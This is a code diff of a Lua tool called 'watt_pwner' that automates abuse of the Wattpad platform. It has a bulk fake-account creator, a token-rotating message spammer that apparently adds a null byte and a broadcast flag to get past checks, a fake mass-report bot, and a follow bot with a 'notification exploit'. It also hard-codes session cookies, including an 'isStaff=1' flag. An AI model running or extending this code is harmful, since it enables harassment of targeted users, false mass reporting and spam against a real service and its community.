@@ -7,7 +7,9 @@ print("\27[38;5;255m")
 local json = require("json")
 local http = require("coro-http")
 -- Constants
-local Version = "0.3-beta"
+local Version = "0.4-beta"
+local maincolor = "\27[38;5;129m"
+local default = "\27[38;5;255m"
 -- Functions
 function GetInput(txt)
     io.write(txt.." > ")
@@ -50,6 +52,12 @@ function appendfile(file,content)
     local old_content = readfile(file)
     writefile(file,old_content..""..content) -- lmao
 end
+function string_random(a,b)
+    return tostring(math.random(a,b))
+end
+function generate_ip()
+   return string_random(0,255).."."..string_random(0,255).."."..string_random(0,255).."."..string_random(0,255).."."
+end
 function http_request(tbl)
     local result,grab = http.request(tbl.Method,tbl.Url,tbl.Headers,tbl.Body)
     local Cookies = {}
@@ -74,7 +82,7 @@ function get_user_from_token(token)
     local home_url = "https://www.wattpad.com/v5/home"
     local response = http_request(
         {
-            Url = home_url,  
+            Url = home_url,
             Method = "GET",
             Headers = {
                 {"Content-Type","application/json; charset=UTF-8"},
@@ -95,7 +103,7 @@ function is_valid_token(token)
     local s,e = pcall(function()
         response = http_request(
             {
-                Url = "https://www.wattpad.com/settings", 
+                Url = "https://www.wattpad.com/settings",
                 Method = "GET",
                 Headers = {
                     {"Cookie","wp_id=22700821-b1ca-4df7-b2ef-48a7ed608faf; fs__exp=4; lang=1; locale=en_US; ff=1; dpr=1; tz=-1; te_session_id=1652040028384; _ga_FNDTZ0MZDQ=GS1.1.1652119923.5.1.1652119960.0; _ga=GA1.1.40407520.1652040029; signupFrom=user_profile; OptanonConsent=isIABGlobal=false&datestamp=Mon+May+09+2022+19%3A12%3A39+GMT%2B0100+(British+Summer+Time)&version=6.10.0&hosts=&consentId=8d8b4b14-e875-4d96-a70a-0ae697964260&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1%2CC0003%3A1%2CSTACK…_t0eY1P9_7__-0zjhfdt-8N3f_X_L8X42M7vF36pq4KuR4Eu3LBIQdlHOHcTUmw6okVrzPsbk2cr7NKJ7PEmnMbO2dYGH9_n93TuZKY7_____7z_v-v_v____f_7-3f3__5_3---_e_V_99zbn9_____9nP___9v-_9________4IsgEmGpeQBdiWODJtGkUKIEYVhIdQKACigGFoisIHVwU7K4CfUELABAKgIwIgQYgowYBAAIBAEhEQEgB4IBEARAIAAQAKgEIACNgEFgBYGAQACgGhYgRQBCBIQZEBEcpgQESJRQT2ViCUHexphCHWWAFAo_oqEBEoAQLAyEhYOY4AkBLhZIFmKF8gBGCAAA.f_gAD_gAAAAA; nextUrl=%2Fhome; isStaff=1; hc=1; token="..token}
@@ -191,17 +199,35 @@ function GenerateIdentity()
     }
 end
 
-
+local options = {
+    [1] = "Account Creator",
+    [2] = "Conversation Spammer",
+    [3] = "Verify Tokens",
+    [4] = "Report Bot",
+    [5] = "Follow Bot + Notification Exploit"
+}
+function output_log(token,msg)
+    print(maincolor.."["..string.sub(token,1,10).."...]"..default.." "..msg)
+end
 
 -- Actual code and shit
-print("\27[48;5;129mWelcome to watt_pwner version "..Version.."!\nCreated by OJ Simpson and an anonymous collaborator\27[48;5;0m")
-print("Please select an option:\n")
-print("[1] Account creator")
-print("[2] Conversation spammer")
-print("[3] Verify tokens")
-print("[4] Report bot")
-print("[5] Follow bot")
-print("[6] Message bot\n")
+print(maincolor.."+-----------------------------+")
+print([[
+ __      __  _ __
+ \ \ /\ / / | '_ \
+  \ V  V /  | |_) |  watt_pwner
+   \_/\_/   | .__/
+      ______| |
+     |______|_|
+]])
+print("+-----------------------------+"..default)
+print("Version: "..Version)
+print("Please select an option:")
+print(maincolor.."+-----------------------------+"..default)
+for i,v in pairs(options) do
+    print("["..i.."] "..v)
+end
+print(maincolor.."+-----------------------------+"..default)
 local option = GetInput("Please select your option")
 if option == "1" then
     print("Account creator selected")
@@ -219,13 +245,13 @@ if option == "1" then
             month = "09",
             day = "09",
             year = "1996"
-            
+
         }
         print("Username: "..id.Username)
         print("Creating account...")
         local response = http_request(
             {
-                Url = "https://www.wattpad.com/signup?nextUrl=/home",  
+                Url = "https://www.wattpad.com/signup?nextUrl=/home",
                 Method = "POST",
                 Headers = {
                     {"Content-Type","application/json; charset=UTF-8"},
@@ -257,28 +283,12 @@ elseif option == "2" then
     local user = GetInput("Target")
     local msges = tonumber(GetInput("Amount of messages"))
     local delay = tonumber(GetInput("Delay between messages"))
-    --local expressvpn_integration = GetInput("AutoVpnSwitch (ExpressVPN + GNU/Linux ONLY!) (y/n)")
-    local expressvpn_integration = "n" -- DO NOT ENABLE, HIGHLY BUGGY
-    if expressvpn_integration:lower() == "y" then
-        print("\27[48;5;1mAutoVpnSwitch is very unstable. It is recommended not to use it.\nAutoVpnSwitch REQUIRES ExpressVPN and GNU/Linux\27[48;5;0m")
-    end
     local switchingvpns = false
     for i = 1,msges,1 do
         local s,e = pcall(function()
-            wait(delay)
-            if expressvpn_integration:lower() == "y" and (i/10 == math.floor(i/10)) then
-                print("Auto switching VPNs")
-                --coroutine.wrap(function()
-                    local switchingvpns = true
-                    os.execute("expressvpn disconnect && expressvpn connect")
-                    wait(5)
-                    switchingvpns = false
-                    print("Continuing..")
-                --end)()
-            end
-            if switchingvpns == false then
+                    if switchingvpns == false then
                 local request = {
-                    body = readfile("message.txt"),
+                    body = readfile("message.txt")..urldecode("%00"),
                     broadcast = false,
                     createDate = nil,
                     from = nil,
@@ -286,12 +296,13 @@ elseif option == "2" then
                     isReply = false,
                     ownername = user,
                     parent_id = nil,
-                    parentId = nil
+                    parentId = nil,
+                    broadcast = true
                 }
                 local thistoken = token[math.random(1,#token)]
                 local response = http_request(
                     {
-                        Url = "https://www.wattpad.com/v4/users/"..user.."/messages", 
+                        Url = "https://www.wattpad.com/v4/users/"..user.."/messages",
                         Method = "POST",
                         Headers = {
                             {"Content-Type","application/json; charset=UTF-8"},
@@ -301,11 +312,12 @@ elseif option == "2" then
                     }
                 )
                 if response and response.result.code == 200 then
-                    print("\27[38;5;255m["..i.."] Success!, Token: "..thistoken)
+                    output_log(thistoken,"Sent message")
                 else
-                    print("\27[38;5;1m["..i.."] Error: "..response.Body..", Token: "..thistoken)
+                    pcall(function() output_log(thistoken,"Error: "..json.decode(response.Body).message) end)
                 end
             end
+            wait(delay)
         end) if e then print("\27[38;5;1m["..i.."] Error: "..e) end
     end
 elseif option == "3" then
@@ -317,9 +329,9 @@ elseif option == "3" then
     for i,thistoken in pairs(token) do
         local valid = is_valid_token(thistoken)
         if valid then
-            print("\27[38;5;120mValid token, Token: "..thistoken)
+            print("Valid token, Token: "..thistoken..""..default)
         else
-            print("\27[38;5;1mInvalid token, Token: "..thistoken)
+            print("\27[38;5;1mInvalid token, Token: "..thistoken..""..default)
             if remove_invalid then
                 table.remove(token,i)
             end
@@ -365,7 +377,7 @@ elseif option == "4" then
         local body = "name="..urlencode(id.Name).."&email="..urlencode(id.Email).."&comment="..urlencode(full_reason).."%0A%0AReported+User's+Profile%3A+https%3A%2F%2Fwww.wattpad.com%2Fuser%2F"..usertoreport.."%0A%0A&ticket_form_id="..tostring(math.random(1000,9999)).."&username="..usertoreport.."&reportType=user&reason="..full_reason.."&custom_fields%5B0%5D%5Bid%5D=22708584&custom_fields%5B0%5D%5Bvalue%5D=en_US&custom_fields%5B1%5D%5Bid%5D=21519886&custom_fields%5B1%5D%5Bvalue%5D=web&custom_fields%5B2%5D%5Bid%5D=22875340&custom_fields%5B2%5D%5Bvalue%5D="..full_reason.."&custom_fields%5B3%5D%5Bid%5D=360041074311&custom_fields%5B3%5D%5Bvalue%5D=user_account_conduct"
         local response = http_request(
             {
-                Url = "https://www.wattpad.com/v4/support/tickets/", 
+                Url = "https://www.wattpad.com/v4/support/tickets/",
                 Method = "POST",
                 Headers = {
                     {"content-type","application/x-www-form-urlencoded; charset=UTF-8"},
@@ -375,9 +387,9 @@ elseif option == "4" then
             }
         )
         if response.result.code == 200 then
-            print("\27[38;5;120m["..i.."] Sent Report! Name used: "..id.Name.."\27[38;5;255m")
+            print("Sent Report! Name used: "..id.Name.."\27[38;5;255m")
         else
-            print("\27[38;5;1m["..i.."] "..response.Body.."\27[38;5;255m")
+            print("\27[38;5;1mError: "..response.Body.."\27[38;5;255m")
         end
     end
 elseif option == "5" then
@@ -392,7 +404,7 @@ elseif option == "5" then
         if is_valid_token(v) then
             local response = http_request(
                 {
-                    Url = "https://www.wattpad.com/api/v3/users/"..get_user_from_token(v).."/following?users="..user, 
+                    Url = "https://www.wattpad.com/api/v3/users/"..get_user_from_token(v).."/following?users="..user,
                     Method = "POST",
                     Headers = {
                         {"content-type","application/x-www-form-urlencoded; charset=UTF-8"},
@@ -402,12 +414,12 @@ elseif option == "5" then
                 }
             )
             if response.result.code == 200 then
-                print("\27[38;5;120m["..i.."] Followed!, Token: "..v.."\27[38;5;255m")
+                output_log(v,"Followed user")
             else
-                print("\27[38;5;1m["..i.."] "..response.Body..", Token: "..v.."\27[38;5;255m")
+                output_log(v,"Error: "..json.decode(response.Body).message)
             end
         else
-            print("\27[38;5;1m["..i.."] Invalid Token, Token: "..v.."\27[38;5;255m")
+            output_log(v,"Invalid token")
         end
     end
     if not_spam_exploit then
@@ -419,35 +431,6 @@ elseif option == "5" then
     else
         for i,v in pairs(token) do
             follow_user(i,v)
-        end
-    end
-elseif option == "6" then
-    local tokenfile = readfile("tokens.txt")
-    local token = split(tokenfile,"\n")
-    print("Loaded "..#token.." tokens.")
-    local user = GetInput("User to spam")
-    local msg = GetInput("Message to spam")
-    local amount_msgs = tonumber(GetInput("Number of messages"))
-    for i = 1,amount_msgs do
-        local thistoken = token[math.random(1,#token)]
-        if is_valid_token(thistoken) then
-            local thisuser = get_user_from_token(thistoken)
-            local response = http_request(
-                {
-                    Url = "https://www.wattpad.com/api/v3/users/"..thisuser.."/inbox/"..user, 
-                    Method = "POST",
-                    Headers = {
-                        {"content-type","application/x-www-form-urlencoded; charset=UTF-8"},
-                        {"Cookie","wp_id=22700821-b1ca-4df7-b2ef-48a7ed608faf; fs__exp=4; lang=1; locale=en_US; ff=1; dpr=1; tz=-1; te_session_id=1652040028384; _ga_FNDTZ0MZDQ=GS1.1.1652119923.5.1.1652119960.0; _ga=GA1.1.40407520.1652040029; signupFrom=user_profile; OptanonConsent=isIABGlobal=false&datestamp=Mon+May+09+2022+19%3A12%3A39+GMT%2B0100+(British+Summer+Time)&version=6.10.0&hosts=&consentId=8d8b4b14-e875-4d96-a70a-0ae697964260&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1%2CC0003%3A1%2CSTACK…_t0eY1P9_7__-0zjhfdt-8N3f_X_L8X42M7vF36pq4KuR4Eu3LBIQdlHOHcTUmw6okVrzPsbk2cr7NKJ7PEmnMbO2dYGH9_n93TuZKY7_____7z_v-v_v____f_7-3f3__5_3---_e_V_99zbn9_____9nP___9v-_9________4IsgEmGpeQBdiWODJtGkUKIEYVhIdQKACigGFoisIHVwU7K4CfUELABAKgIwIgQYgowYBAAIBAEhEQEgB4IBEARAIAAQAKgEIACNgEFgBYGAQACgGhYgRQBCBIQZEBEcpgQESJRQT2ViCUHexphCHWWAFAo_oqEBEoAQLAyEhYOY4AkBLhZIFmKF8gBGCAAA.f_gAD_gAAAAA; nextUrl=%2Fhome; isStaff=1; hc=1; token="..thistoken}
-                    },
-                    Body = "sender="..thisuser.."&recipient="..user.."&body="..msg
-                }
-            )
-            if response.result.code == 200 then
-                print("\27[38;5;120m["..i.."] Sent message!, Token: "..thistoken.."\27[38;5;255m")
-            else
-                print("\27[38;5;1m["..i.."] "..response.Body..", Token: "..thistoken.."\27[38;5;255m")
-            end
         end
     end
 end
